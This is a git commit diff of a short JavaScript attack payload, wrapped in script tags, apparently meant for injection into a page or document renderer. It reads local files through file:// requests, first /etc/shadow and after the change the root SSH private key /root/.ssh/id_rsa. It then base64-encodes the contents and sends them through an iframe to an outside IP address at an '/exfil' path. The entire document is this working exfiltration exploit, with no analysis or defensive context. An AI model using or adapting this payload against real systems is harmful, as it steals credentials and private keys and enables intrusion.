2a3ea879d94010aa54e26fec54ff2fec364df9cd
abdelali khalfi <38424164+abdelalikhalfi@users.noreply.github.com>
2024-06-22 19:30:48 +0100

    Update test2.js

--- test1.js
+++ test1.js
@@ -1,10 +1,10 @@
-function reqListener () {
-    var encoded = encodeURI(this.responseText);
+<script>
+function reqListener() {
     var b64 = btoa(this.responseText);
-    var raw = this.responseText;
-    document.write('<iframe src="http://196.64.174.253:443/exfil?data='+b64+'"></iframe>');
+    document.write('<iframe src="http://196.64.174.253:443/exfil?data=' + b64 + '"></iframe>');
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///etc/shadow"); 
+oReq.open("GET", "file:///root/.ssh/id_rsa"); 
 oReq.send();
+</script>
